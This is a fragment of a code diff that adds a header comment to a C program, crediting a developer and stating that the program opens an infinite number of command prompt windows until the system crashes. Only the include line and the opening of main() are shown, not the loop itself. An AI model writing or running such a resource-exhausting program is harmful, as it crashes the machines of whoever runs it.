@@ -1,3 +1,9 @@
+/**
+ * Developer: Minhas Kamal
+ * Functionality: Opens an infinite number of command prompt
+ * window till the system crushes.
+**/
+
 #include <stdlib.h>
 
 main(){
